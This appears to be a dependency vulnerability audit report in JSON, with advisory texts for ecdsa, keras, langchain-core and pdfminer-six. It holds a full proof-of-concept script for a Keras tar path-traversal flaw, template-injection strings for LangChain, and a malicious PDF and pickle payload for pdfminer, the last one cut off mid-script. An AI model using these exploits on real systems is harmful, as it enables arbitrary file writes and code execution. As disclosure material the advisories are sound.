{"dependencies": [{"name": "absl-py", "version": "2.3.1", "vulns": []}, {"name": "acres", "version": "0.5.0", "vulns": []}, {"name": "aiofiles", "version": "24.1.0", "vulns": []}, {"name": "aiohappyeyeballs", "version": "2.6.1", "vulns": []}, {"name": "aiohttp", "version": "3.12.15", "vulns": []}, {"name": "aiosignal", "version": "1.4.0", "vulns": []}, {"name": "alembic", "version": "1.17.0", "vulns": []}, {"name": "altgraph", "version": "0.17.4", "vulns": []}, {"name": "annotated-doc", "version": "0.0.3", "vulns": []}, {"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "anyio", "version": "4.11.0", "vulns": []}, {"name": "astunparse", "version": "1.6.3", "vulns": []}, {"name": "attrs", "version": "25.3.0", "vulns": []}, {"name": "bcrypt", "version": "5.0.0", "vulns": []}, {"name": "beautifulsoup4", "version": "4.13.5", "vulns": []}, {"name": "blinker", "version": "1.9.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "bs4", "version": "0.0.2", "vulns": []}, {"name": "build", "version": "1.3.0", "vulns": []}, {"name": "cachecontrol", "version": "0.14.3", "vulns": []}, {"name": "cairocffi", "version": "1.6.1", "vulns": []}, {"name": "cairosvg", "version": "2.7.1", "vulns": []}, {"name": "certifi", "version": "2025.10.5", "vulns": []}, {"name": "cffi", "version": "2.0.0", "vulns": []}, {"name": "cfgv", "version": "3.4.0", "vulns": []}, {"name": "chardet", "version": "5.2.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.4.4", "vulns": []}, {"name": "ci-info", "version": "0.3.0", "vulns": []}, {"name": "click", "version": "8.3.0", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "configobj", "version": "5.0.9", "vulns": []}, {"name": "configparser", "version": "7.2.0", "vulns": []}, {"name": "coverage", "version": "7.11.0", "vulns": []}, {"name": "cryptography", "version": "46.0.3", "vulns": []}, {"name": "cssselect2", "version": "0.8.0", "vulns": []}, {"name": "ctransformers", "version": "0.2.27", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "9.1.0", "vulns": []}, {"name": "dataclasses-json", "version": "0.6.7", "vulns": []}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "deprecated", "version": "1.3.0", "vulns": []}, {"name": "distlib", "version": "0.4.0", "vulns": []}, {"name": "distro", "version": "1.9.0", "vulns": []}, {"name": "dnspython", "version": "2.8.0", "vulns": []}, {"name": "docker", "version": "7.1.0", "vulns": []}, {"name": "ebooklib", "version": "0.19", "vulns": []}, {"name": "ecdsa", "version": "0.19.1", "vulns": [{"id": "GHSA-wj6h-64fc-37mp", "fix_versions": [], "aliases": ["CVE-2024-23342"], "description": "python-ecdsa has been found to be subject to a Minerva timing attack on the P-256 curve. Using the `ecdsa.SigningKey.sign_digest()` API function and timing signatures an attacker can leak the internal nonce which may allow for private key discovery. Both ECDSA signatures, key generation, and ECDH operations are affected. ECDSA signature verification is unaffected. The python-ecdsa project considers side channel attacks out of scope for the project and there is no planned fix."}]}, {"name": "email-validator", "version": "2.3.0", "vulns": []}, {"name": "et-xmlfile", "version": "2.0.0", "vulns": []}, {"name": "etelemetry", "version": "0.3.1", "vulns": []}, {"name": "faiss-cpu", "version": "1.12.0", "vulns": []}, {"name": "fastapi", "version": "0.121.2", "vulns": []}, {"name": "fastapi-csrf-protect", "version": "1.0.7", "vulns": []}, {"name": "filelock", "version": "3.20.0", "vulns": []}, {"name": "flask", "version": "3.1.2", "vulns": []}, {"name": "flask-cors", "version": "6.0.1", "vulns": []}, {"name": "flatbuffers", "version": "25.2.10", "vulns": []}, {"name": "fpdf", "version": "1.7.2", "vulns": []}, {"name": "frozenlist", "version": "1.7.0", "vulns": []}, {"name": "fsspec", "version": "2025.9.0", "vulns": []}, {"name": "gast", "version": "0.6.0", "vulns": []}, {"name": "git-filter-repo", "version": "2.47.0", "vulns": []}, {"name": "google-pasta", "version": "0.2.0", "vulns": []}, {"name": "greenlet", "version": "3.2.4", "vulns": []}, {"name": "grpcio", "version": "1.75.0", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "h5py", "version": "3.14.0", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "httplib2", "version": "0.31.0", "vulns": []}, {"name": "httptools", "version": "0.7.1", "vulns": []}, {"name": "httpx", "version": "0.27.2", "vulns": []}, {"name": "httpx-sse", "version": "0.4.1", "vulns": []}, {"name": "huggingface-hub", "version": "0.35.0", "vulns": []}, {"name": "identify", "version": "2.6.15", "vulns": []}, {"name": "idna", "version": "3.11", "vulns": []}, {"name": "iniconfig", "version": "2.3.0", "vulns": []}, {"name": "itsdangerous", "version": "2.2.0", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "jiter", "version": "0.11.0", "vulns": []}, {"name": "joblib", "version": "1.5.2", "vulns": []}, {"name": "jsonpatch", "version": "1.33", "vulns": []}, {"name": "jsonpointer", "version": "3.0.0", "vulns": []}, {"name": "jsonschema", "version": "4.25.1", "vulns": []}, {"name": "jsonschema-specifications", "version": "2025.9.1", "vulns": []}, {"name": "keras", "version": "3.11.3", "vulns": [{"id": "GHSA-mq84-hjqx-cwf2", "fix_versions": ["3.12.0"], "aliases": ["CVE-2025-12058"], "description": "The Keras.Model.load_model method, including when executed with the intended security mitigation safe_mode=True, is vulnerable to arbitrary local file loading and Server-Side Request Forgery (SSRF).   This vulnerability stems from the way the StringLookup layer is handled during model loading from a specially crafted .keras archive. The constructor for the StringLookup layer accepts a vocabulary argument that can specify a local file path or a remote file path.    *  Arbitrary Local File Read: An attacker can create a malicious .keras file that embeds a local path in the StringLookup layer's configuration. When the model is loaded, Keras will attempt to read the content of the specified local file and incorporate it into the model state (e.g., retrievable via get_vocabulary()), allowing an attacker to read arbitrary local files on the hosting system.     *  Server-Side Request Forgery (SSRF): Keras utilizes tf.io.gfile for file operations. Since tf.io.gfile supports remote filesystem handlers (such as GCS and HDFS) and HTTP/HTTPS protocols, the same mechanism can be leveraged to fetch content from arbitrary network endpoints on the server's behalf, resulting in an SSRF condition.   The security issue is that the feature allowing external path loading was not properly restricted by the safe_mode=True flag, which was intended to prevent such unintended data access."}, {"id": "GHSA-hjqc-jx6g-rwp9", "fix_versions": ["3.12.0"], "aliases": ["CVE-2025-12060"], "description": "## Summary  Keras's `keras.utils.get_file()` function is vulnerable to directory traversal attacks despite implementing `filter_safe_paths()`. The vulnerability exists because `extract_archive()` uses Python's `tarfile.extractall()` method without the security-critical `filter=\"data\"` parameter. A PATH_MAX symlink resolution bug occurs before path filtering, allowing malicious tar archives to bypass security checks and write files outside the intended extraction directory.  ## Details  ### Root Cause Analysis  **Current Keras Implementation** ```python # From keras/src/utils/file_utils.py#L121 if zipfile.is_zipfile(file_path):     # Zip archive.     archive.extractall(path) else:     # Tar archive, perhaps unsafe. Filter paths.     archive.extractall(path, members=filter_safe_paths(archive)) ```  ### The Critical Flaw  While Keras attempts to filter unsafe paths using `filter_safe_paths()`, this filtering happens after the tar archive members are parsed and before actual extraction. However, the PATH_MAX symlink resolution bug occurs during extraction, not during member enumeration.  **Exploitation Flow:** 1. **Archive parsing**: `filter_safe_paths()` sees symlink paths that appear safe 2. **Extraction begins**: `extractall()` processes the filtered members 3. **PATH_MAX bug triggers**: Symlink resolution fails due to path length limits 4. **Security bypass**: Failed resolution causes literal path interpretation 5. **Directory traversal**: Files written outside intended directory  ### Technical Details  The vulnerability exploits a known issue in Python's `tarfile` module where excessively long symlink paths can cause resolution failures, leading to the symlink being treated as a literal path. This bypasses Keras's path filtering because:  - `filter_safe_paths()` operates on the parsed tar member information - The PATH_MAX bug occurs during actual file system operations in `extractall()` - Failed symlink resolution falls back to literal path interpretation - This allows traversal paths like `../../../../etc/passwd` to be written  ### Affected Code Location  **File**: `keras/src/utils/file_utils.py`   **Function**: `extract_archive()` around line 121   **Issue**: Missing `filter=\"data\"` parameter in `tarfile.extractall()`  ## Proof of Concept ``` #!/usr/bin/env python3 import os, io, sys, tarfile, pathlib, platform, threading, time import http.server, socketserver  # Import Keras directly (not through TensorFlow) try:     import keras     print(\"Using standalone Keras:\", keras.__version__)     get_file = keras.utils.get_file except ImportError:     try:         import tensorflow as tf         print(\"Using Keras via TensorFlow:\", tf.keras.__version__)         get_file = tf.keras.utils.get_file     except ImportError:         print(\"Neither Keras nor TensorFlow found!\")         sys.exit(1)  print(\"=\" * 60) print(\"Keras get_file() PATH_MAX Symlink Vulnerability PoC\") print(\"=\" * 60) print(\"Python:\", sys.version.split()[0]) print(\"Platform:\", platform.platform())  root = pathlib.Path.cwd() print(f\"Working directory: {root}\")  # Create target directory for exploit demonstration exploit_dir = root / \"exploit\" exploit_dir.mkdir(exist_ok=True)  # Clean up any previous exploit files try:     (exploit_dir / \"keras_pwned.txt\").unlink() except FileNotFoundError:     pass  print(f\"\\n=== INITIAL STATE ===\") print(f\"Exploit directory: {exploit_dir}\") print(f\"Files in exploit/: {[f.name for f in exploit_dir.iterdir()]}\")  # Create malicious tar with PATH_MAX symlink resolution bug print(f\"\\n=== Building PATH_MAX Symlink Exploit ===\")  # Parameters for PATH_MAX exploitation comp = 'd' * (55 if sys.platform == 'darwin' else 247) steps = \"abcdefghijklmnop\"  # 16-step symlink chain path = \"\"  with tarfile.open(\"keras_dataset.tgz\", mode=\"w:gz\") as tar:     print(\"Creating deep symlink chain...\")          # Build the symlink chain that will exceed PATH_MAX during resolution     for i, step in enumerate(steps):         # Directory with long name         dir_info = tarfile.TarInfo(os.path.join(path, comp))         dir_info.type = tarfile.DIRTYPE         tar.addfile(dir_info)                  # Symlink pointing to that directory         link_info = tarfile.TarInfo(os.path.join(path, step))         link_info.type = tarfile.SYMTYPE         link_info.linkname = comp         tar.addfile(link_info)                  path = os.path.join(path, comp)                  if i < 3 or i % 4 == 0:  # Print progress for first few and every 4th             print(f\"  Step {i+1}: {step} -> {comp[:20]}...\")          # Create the final symlink that exceeds PATH_MAX     # This is where the symlink resolution breaks down     long_name = \"x\" * 254     linkpath = os.path.join(\"/\".join(steps), long_name)          max_link = tarfile.TarInfo(linkpath)     max_link.type = tarfile.SYMTYPE     max_link.linkname = (\"../\" * len(steps))     tar.addfile(max_link)          print(f\"\u2713 Created PATH_MAX symlink: {len(linkpath)} characters\")     print(f\"  Points to: {'../' * len(steps)}\")          # Exploit file through the broken symlink resolution     exploit_path = linkpath + \"/../../../exploit/keras_pwned.txt\"     exploit_content = b\"KERAS VULNERABILITY CONFIRMED!\\nThis file was created outside the cache directory!\\nKeras get_file() is vulnerable to PATH_MAX symlink attacks!\\n\"          exploit_file = tarfile.TarInfo(exploit_path)     exploit_file.type = tarfile.REGTYPE     exploit_file.size = len(exploit_content)     tar.addfile(exploit_file, fileobj=io.BytesIO(exploit_content))          print(f\"\u2713 Added exploit file via broken symlink path\")          # Add legitimate dataset content     dataset_content = b\"# Keras Dataset Sample\\nThis appears to be a legitimate ML dataset\\nimage1.jpg,cat\\nimage2.jpg,dog\\nimage3.jpg,bird\\n\"     dataset_file = tarfile.TarInfo(\"dataset/labels.csv\")     dataset_file.type = tarfile.REGTYPE     dataset_file.size = len(dataset_content)     tar.addfile(dataset_file, fileobj=io.BytesIO(dataset_content))          # Dataset directory     dataset_dir = tarfile.TarInfo(\"dataset/\")     dataset_dir.type = tarfile.DIRTYPE     tar.addfile(dataset_dir)  print(\"\u2713 Malicious Keras dataset created\")  # Comparison Test: Python tarfile with filter (SAFE) print(f\"\\n=== COMPARISON: Python tarfile with data filter ===\") try:     with tarfile.open(\"keras_dataset.tgz\", \"r:gz\") as tar:         tar.extractall(\"python_safe\", filter=\"data\")          files_after = [f.name for f in exploit_dir.iterdir()]     print(f\"\u2713 Python safe extraction completed\")     print(f\"Files in exploit/: {files_after}\")          # Cleanup     import shutil     if pathlib.Path(\"python_safe\").exists():         shutil.rmtree(\"python_safe\", ignore_errors=True)          except Exception as e:     print(f\"\u274c Python safe extraction blocked: {str(e)[:80]}...\")     files_after = [f.name for f in exploit_dir.iterdir()]     print(f\"Files in exploit/: {files_after}\")  # Start HTTP server to serve malicious archive class SilentServer(http.server.SimpleHTTPRequestHandler):     def log_message(self, *args): pass  def run_server():     with socketserver.TCPServer((\"127.0.0.1\", 8005), SilentServer) as httpd:         httpd.allow_reuse_address = True         httpd.serve_forever()  server = threading.Thread(target=run_server, daemon=True) server.start() time.sleep(0.3)  # Keras vulnerability test cache_dir = root / \"keras_cache\" cache_dir.mkdir(exist_ok=True) url = \"http://127.0.0.1:8005/keras_dataset.tgz\"  print(f\"\\n=== KERAS VULNERABILITY TEST ===\") print(f\"Testing: keras.utils.get_file() with extract=True\") print(f\"URL: {url}\") print(f\"Cache: {cache_dir}\") print(f\"Expected extraction: keras_cache/datasets/keras_dataset/\") print(f\"Exploit target: exploit/keras_pwned.txt\")  try:     # The vulnerable Keras call     extracted_path = get_file(         \"keras_dataset\",         url,         cache_dir=str(cache_dir),         extract=True     )     print(f\"\u2713 Keras extraction completed\")     print(f\"\u2713 Returned path: {extracted_path}\")      except Exception as e:     print(f\"\u274c Keras extraction failed: {e}\")     import traceback     traceback.print_exc()  # Vulnerability assessment print(f\"\\n=== VULNERABILITY RESULTS ===\") final_exploit_files = [f.name for f in exploit_dir.iterdir()] print(f\"Files in exploit directory: {final_exploit_files}\")  if \"keras_pwned.txt\" in final_exploit_files:     print(f\"\\n\ud83d\udea8 KERAS VULNERABILITY CONFIRMED! \ud83d\udea8\")          exploit_file = exploit_dir / \"keras_pwned.txt\"     content = exploit_file.read_text()     print(f\"Exploit file created: {exploit_file}\")     print(f\"Content:\\n{content}\")          print(f\"\ud83d\udd0d TECHNICAL DETAILS:\")     print(f\"   \u2022 Keras uses tarfile.extractall() without filter parameter\")     print(f\"   \u2022 PATH_MAX symlink resolution bug bypassed security checks\")     print(f\"   \u2022 File created outside intended cache directory\")     print(f\"   \u2022 Same vulnerability pattern as TensorFlow get_file()\")          print(f\"\\n\ud83d\udcca COMPARISON RESULTS:\")     print(f\"   \u2705 Python with filter='data': BLOCKED exploit\")     print(f\"   \u26a0\ufe0f  Keras get_file(): ALLOWED exploit\")      else:     print(f\"\u2705 No exploit files detected\")     print(f\"Possible reasons:\")     print(f\"   \u2022 Keras version includes security patches\")     print(f\"   \u2022 Platform-specific path handling prevented exploit\")     print(f\"   \u2022 Archive extraction path differed from expected\")  # Show what Keras actually extracted (safely) print(f\"\\n=== KERAS EXTRACTION ANALYSIS ===\") try:     if 'extracted_path' in locals() and pathlib.Path(extracted_path).exists():         keras_path = pathlib.Path(extracted_path)         print(f\"Keras extracted to: {keras_path}\")                  # Safely list contents         try:             contents = [item.name for item in keras_path.iterdir()]             print(f\"Top-level contents: {contents}\")                          # Count symlinks (indicates our exploit structure was created)             symlink_count = 0             for item in keras_path.iterdir():                 try:                     if item.is_symlink():                         symlink_count += 1                 except PermissionError:                     continue                          print(f\"Symlinks created: {symlink_count}\")             if symlink_count > 0:                 print(f\"\u2713 PATH_MAX symlink chain was extracted\")                          except PermissionError:             print(f\"Permission errors in extraction directory (expected with symlink corruption)\")              except Exception as e:     print(f\"Could not analyze Keras extraction: {e}\")  print(f\"\\n=== REMEDIATION ===\") print(f\"To fix this vulnerability, Keras should use:\") print(f\"```python\") print(f\"tarfile.extractall(path, filter='data')  # Safe\") print(f\"```\") print(f\"Instead of:\") print(f\"```python\")  print(f\"tarfile.extractall(path)  # Vulnerable\") print(f\"```\")  # Cleanup print(f\"\\n=== CLEANUP ===\") try:     os.unlink(\"keras_dataset.tgz\")     print(f\"\u2713 Removed malicious tar file\") except:     pass  print(\"PoC completed!\")  ``` ### Environment Setup - **Python**: 3.8+ (tested on multiple versions) - **Keras**: Standalone Keras or TensorFlow.Keras - **Platform**: Linux, macOS, Windows (path handling varies)  ### Exploitation Steps  1. **Create malicious tar archive** with PATH_MAX symlink chain 2. **Host archive** on accessible HTTP server 3. **Call `keras.utils.get_file()`** with `extract=True` 4. **Observe directory traversal** - files written outside cache directory  ### Key Exploit Components  - **Deep symlink chain**: 16+ nested symlinks with long directory names - **PATH_MAX overflow**: Final symlink path exceeding system limits - **Traversal payload**: Relative path traversal (`../../../target/file`) - **Legitimate disguise**: Archive contains valid-looking dataset files  ### Demonstration Results  **Vulnerable behavior:** - Files extracted outside intended `cache_dir/datasets/` location - Security filtering bypassed completely - No error or warning messages generated  **Expected secure behavior:** - Extraction blocked or confined to cache directory - Security warnings for suspicious archive contents  ## Impact  ### Vulnerability Classification - **Type**: Directory Traversal / Path Traversal (CWE-22) - **Severity**: High - **CVSS Components**: Network accessible, no authentication required, impacts confidentiality and integrity  ### Who Is Impacted  **Direct Impact:** - Applications using `keras.utils.get_file()` with `extract=True` - Machine learning pipelines downloading and extracting datasets - Automated ML training systems processing external archives  **Attack Scenarios:** 1. **Malicious datasets**: Attacker hosts compromised ML dataset 2. **Supply chain**: Legitimate dataset repositories compromised 3. **Model poisoning**: Extraction writes malicious files alongside training data 4. **System compromise**: Configuration files, executables written to system directories  **Affected Environments:** - Research environments downloading public datasets - Production ML systems with automated dataset fetching - Educational platforms using Keras for tutorials - CI/CD pipelines training models with external data  ### Risk Assessment  **High Risk Factors:** - Common usage pattern in ML workflows - No user awareness of extraction security - Silent failure mode (no warnings) - Cross-platform vulnerability  **Potential Consequences:** - Arbitrary file write on target system - Configuration file tampering - Code injection via overwritten scripts - Data exfiltration through planted files - System compromise in containerized environments  ## Recommended Fix  ### Immediate Mitigation  Replace the vulnerable extraction code with:  ```python # Secure implementation if zipfile.is_zipfile(file_path):     # Zip archive - implement similar filtering     archive.extractall(path, members=filter_safe_paths(archive)) else:     # Tar archive with proper security filter     archive.extractall(path, members=filter_safe_paths(archive), filter=\"data\") ```  ### Long-term Solution  1. **Add `filter=\"data\"` parameter** to all `tarfile.extractall()` calls 2. **Implement comprehensive path validation** before extraction 3. **Add extraction logging** for security monitoring 4. **Consider sandboxed extraction** for untrusted archives 5. **Update documentation** to warn about archive security risks  ### Backward Compatibility  The fix maintains full backward compatibility as `filter=\"data\"` is the recommended secure default for Python 3.12+.  ## References  - [[Python tarfile security documentation](https://docs.python.org/3/library/tarfile.html#extraction-filters)](https://docs.python.org/3/library/tarfile.html#extraction-filters) - [[CVE-2007-4559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559) - Related tarfile vulnerability - [[OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)](https://owasp.org/www-community/attacks/Path_Traversal)  Note: Reported in Huntr as well, but didn't get response https://huntr.com/bounties/f94f5beb-54d8-4e6a-8bac-86d9aee103f4"}]}, {"name": "langchain", "version": "0.3.27", "vulns": []}, {"name": "langchain-community", "version": "0.3.29", "vulns": []}, {"name": "langchain-core", "version": "0.3.76", "vulns": [{"id": "GHSA-6qv9-48xg-fc7f", "fix_versions": ["0.3.80", "1.0.7"], "aliases": ["CVE-2025-65106"], "description": "## Context  A template injection vulnerability exists in LangChain's prompt template system that allows attackers to access Python object internals through template syntax. This vulnerability affects applications that accept **untrusted template strings** (not just template variables) in `ChatPromptTemplate` and related prompt template classes.  Templates allow attribute access (`.`) and indexing (`[]`) but not method invocation (`()`).  The combination of attribute access and indexing may enable exploitation depending on which objects are passed to templates. When template variables are simple strings (the common case), the impact is limited. However, when using `MessagesPlaceholder` with chat message objects, attackers can traverse through object attributes and dictionary lookups (e.g., `__globals__`) to reach sensitive data such as environment variables.  The vulnerability specifically requires that applications accept **template strings** (the structure) from untrusted sources, not just **template variables** (the data). Most applications either do not use templates or else use hardcoded templates and are not vulnerable.  ## Affected Components  - `langchain-core` package - Template formats:   - F-string templates (`template_format=\"f-string\"`) - **Vulnerability fixed**   - Mustache templates (`template_format=\"mustache\"`) - **Defensive hardening**   - Jinja2 templates (`template_format=\"jinja2\"`) - **Defensive hardening**  ### Impact Attackers who can control template strings (not just template variables) can: - Access Python object attributes and internal properties via attribute traversal - Extract sensitive information from object internals (e.g., `__class__`, `__globals__`) - Potentially escalate to more severe attacks depending on the objects passed to templates  ### Attack Vectors  #### 1. F-string Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate  malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__.__name__}\")],     template_format=\"f-string\" )  # Note that this requires passing a placeholder variable for \"msg.__class__.__name__\". result = malicious_template.invoke({\"msg\": \"foo\", \"msg.__class__.__name__\": \"safe_placeholder\"}) # Previously returned # >>> result.messages[0].content # >>> 'str' ```  #### 2. Mustache Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.__class__.__name__}}\")],     template_format=\"mustache\" )  result = malicious_template.invoke({\"question\": msg}) # Previously returned: \"HumanMessage\" (getattr() exposed internals) ```  #### 3. Jinja2 Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.parse_raw}}\")],     template_format=\"jinja2\" )  result = malicious_template.invoke({\"question\": msg}) # Could access non-dunder attributes/methods on objects ```  ### Root Cause  1. **F-string templates**: The implementation used Python's `string.Formatter().parse()` to extract variable names from template strings. This method returns the complete field expression, including attribute access syntax:      ```python      from string import Formatter       template = \"{msg.__class__} and {x}\"      print([var_name for (_, var_name, _, _) in Formatter().parse(template)])      # Returns: ['msg.__class__', 'x']     ```      The extracted names were not validated to ensure they were simple identifiers. As a result, template strings containing attribute traversal and indexing expressions (e.g., `{obj.__class__.__name__}` or `{obj.method.__globals__[os]}`) were accepted and subsequently evaluated during formatting. While f-string templates do not support method calls with `()`, they do support `[]` indexing, which could allow traversal through dictionaries like `__globals__` to reach sensitive objects. 2. **Mustache templates**: By design, used `getattr()` as a fallback to support accessing attributes on objects (e.g., `{{user.name}}` on a User object). However, we decided to restrict this to simpler primitives that subclass dict, list, and tuple types as defensive hardening, since untrusted templates could exploit attribute access to reach internal properties like class on arbitrary objects 3. **Jinja2 templates**: Jinja2's default `SandboxedEnvironment` blocks dunder attributes (e.g., `__class__`) but permits access to other attributes and methods on objects. While Jinja2 templates in LangChain are typically used with trusted template strings, as a defense-in-depth measure, we've restricted the environment to block all attribute and method access on objects    passed to templates.   ## Who Is Affected?  ### High Risk Scenarios You are affected if your application: - Accepts template strings from untrusted sources (user input, external APIs, databases) - Dynamically constructs prompt templates based on user-provided patterns - Allows users to customize or create prompt templates  **Example vulnerable code:** ```python # User controls the template string itself user_template_string = request.json.get(\"template\")  # DANGEROUS  prompt = ChatPromptTemplate.from_messages(     [(\"human\", user_template_string)],     template_format=\"mustache\" )  result = prompt.invoke({\"data\": sensitive_object}) ```  ### Low/No Risk Scenarios You are **NOT** affected if: - Template strings are hardcoded in your application code - Template strings come only from trusted, controlled sources - Users can only provide **values** for template variables, not the template structure itself  **Example safe code:** ```python # Template is hardcoded - users only control variables prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"User question: {question}\")],  # SAFE     template_format=\"f-string\" )  # User input only fills the 'question' variable result = prompt.invoke({\"question\": user_input}) ```  ## The Fix  ### F-string Templates F-string templates had a clear vulnerability where attribute access syntax was exploitable. We've added strict validation to prevent this:  - Added validation to enforce that variable names must be valid Python identifiers - Rejects syntax like `{obj.attr}`, `{obj[0]}`, or `{obj.__class__}` - Only allows simple variable names: `{variable_name}`  ```python # After fix - these are rejected at template creation time ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__}\")],  # ValueError: Invalid variable name     template_format=\"f-string\" ) ```  ### Mustache Templates (Defensive Hardening) As defensive hardening, we've restricted what Mustache templates support to reduce the attack surface:  - Replaced `getattr()` fallback with strict type checking - Only allows traversal into `dict`, `list`, and `tuple` types - Blocks attribute access on arbitrary Python objects  ```python # After hardening - attribute access returns empty string prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.__class__}}\")],     template_format=\"mustache\" ) result = prompt.invoke({\"msg\": HumanMessage(\"test\")}) # Returns: \"\" (access blocked) ```  ### Jinja2 Templates (Defensive Hardening) As defensive hardening, we've significantly restricted Jinja2 template capabilities:  - Introduced `_RestrictedSandboxedEnvironment` that blocks **ALL** attribute/method access - Only allows simple variable lookups from the context dictionary - Raises `SecurityError` on any attribute access attempt  ```python # After hardening - all attribute access is blocked prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.content}}\")],     template_format=\"jinja2\" ) # Raises SecurityError: Access to attributes is not allowed ```  **Important Recommendation**: Due to the expressiveness of Jinja2 and the difficulty of fully sandboxing it, **we recommend reserving Jinja2 templates for trusted sources only**. If you need to accept template strings from untrusted users, use f-string or mustache templates with the new restrictions instead.  While we've hardened the Jinja2 implementation, the nature of templating engines makes comprehensive sandboxing challenging. The safest approach is to only use Jinja2 templates when you control the template source.  **Important Reminder**: Many applications do not need prompt templates. Templates are useful for variable substitution and dynamic logic (if statements, loops, conditionals). However, if you're building a chatbot or conversational application, you can often work directly with message objects (e.g., `HumanMessage`, `AIMessage`, `ToolMessage`) without templates. Direct message construction avoids template-related security concerns entirely.  ## Remediation  ### Immediate Actions  1. **Audit your code** for any locations where template strings come from untrusted sources 2. **Update to the patched version** of `langchain-core` 3. **Review template usage** to ensure separation between template structure and user data  ### Best Practices  - **Consider if you need templates at all** - Many applications can work directly with message objects (`HumanMessage`, `AIMessage`, etc.) without templates - **Reserve Jinja2 for trusted sources** - Only use Jinja2 templates when you fully control the template content"}]}, {"name": "langchain-openai", "version": "0.3.33", "vulns": []}, {"name": "langchain-text-splitters", "version": "0.3.11", "vulns": []}, {"name": "langsmith", "version": "0.4.30", "vulns": []}, {"name": "libclang", "version": "18.1.1", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "limits", "version": "5.6.0", "vulns": []}, {"name": "looseversion", "version": "1.3.0", "vulns": []}, {"name": "lxml", "version": "6.0.2", "vulns": []}, {"name": "mako", "version": "1.3.10", "vulns": []}, {"name": "markdown", "version": "3.9", "vulns": []}, {"name": "markdown-it-py", "version": "4.0.0", "vulns": []}, {"name": "markupsafe", "version": "3.0.3", "vulns": []}, {"name": "marshmallow", "version": "4.0.1", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "ml-dtypes", "version": "0.5.3", "vulns": []}, {"name": "mpmath", "version": "1.3.0", "vulns": []}, {"name": "msgpack", "version": "1.1.2", "vulns": []}, {"name": "multidict", "version": "6.6.4", "vulns": []}, {"name": "mypy", "version": "1.3.0", "vulns": []}, {"name": "mypy-extensions", "version": "1.1.0", "vulns": []}, {"name": "namex", "version": "0.1.0", "vulns": []}, {"name": "networkx", "version": "3.5", "vulns": []}, {"name": "nibabel", "version": "5.3.2", "vulns": []}, {"name": "nipype", "version": "1.10.0", "vulns": []}, {"name": "nodeenv", "version": "1.9.1", "vulns": []}, {"name": "numpy", "version": "2.3.3", "vulns": []}, {"name": "odfpy", "version": "1.4.1", "vulns": []}, {"name": "openai", "version": "1.108.1", "vulns": []}, {"name": "openpyxl", "version": "3.1.5", "vulns": []}, {"name": "opt-einsum", "version": "3.4.0", "vulns": []}, {"name": "optree", "version": "0.17.0", "vulns": []}, {"name": "orjson", "version": "3.11.3", "vulns": []}, {"name": "packageurl-python", "version": "0.17.5", "vulns": []}, {"name": "packaging", "version": "25.0", "vulns": []}, {"name": "pandas", "version": "2.3.3", "vulns": []}, {"name": "passlib", "version": "1.7.4", "vulns": []}, {"name": "pathlib", "version": "1.0.1", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "pdfminer-six", "version": "20250506", "vulns": [{"id": "GHSA-wf5f-4jwr-ppcp", "fix_versions": ["20251107"], "aliases": ["CVE-2025-64512"], "description": "### Summary  pdfminer.six will execute arbitrary code from a malicious pickle file if provided with a malicious PDF file. The `CMapDB._load_data()` function in pdfminer.six uses `pickle.loads()` to deserialize pickle files. These pickle files are supposed to be part of the pdfminer.six distribution stored in the `cmap/` directory, but a malicious PDF can specify an alternative directory and filename as long as the filename ends in `.pickle.gz`. A malicious, zipped pickle file can then contain code which will automatically execute when the PDF is processed.  ### Details  ```python # Vulnerable code in pdfminer/cmapdb.py:233-246 def _load_data(cls, name: str) -> Any:     name = name.replace(\"\\0\", \"\")  # Insufficient sanitization     filename = \"%s.pickle.gz\" % name     # ... path construction ...     path = os.path.join(directory, filename) # If filename is an absolte path, directory is ignored     # ...     return type(str(name), (), pickle.loads(gzfile.read()))  # Unsafe deserialization ```  An attacker can: 1. Create a malicious PDF with a CMap reference like `/malicious` 2. Place a malicious pickle file at `/malicious.pickle.gz` 3. When the PDF is processed, pdfminer loads and deserializes the malicious pickle 4. The pickle deserialization can execute arbitrary Python code  ### POC  #### Malicious PDF  Create a PDF with a malicious CMAP entry:  ``` 5 0 obj << /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H /Encoding /#2Fpdfs#2Fmalicious /DescendantFonts [6 0 R] >> endobj ```  Here the /Encoding points to `/pdfs/malicious`. Pdfminer will append the extension `.pickle.gz` to this filename. Place the PDF in a file called `/pdfs/malicious.pdf`.  #### Malicious Pickle  Create a malicious, zipped pickle to execute. For example, with this Python script:  ```python #!/usr/bin/env python3 import pickle import gzip  def create_demo_pickle():     print(\"Creating demonstration pickle file...\")      # Create payload that executes code AND returns a dict (as pdfminer expects)     class EvilPayload:         def __reduce__(self):             # This function will be called during unpickling             code = \"print('Malicious code executed.') or exit(0) or {}\"             return (eval, (code,))      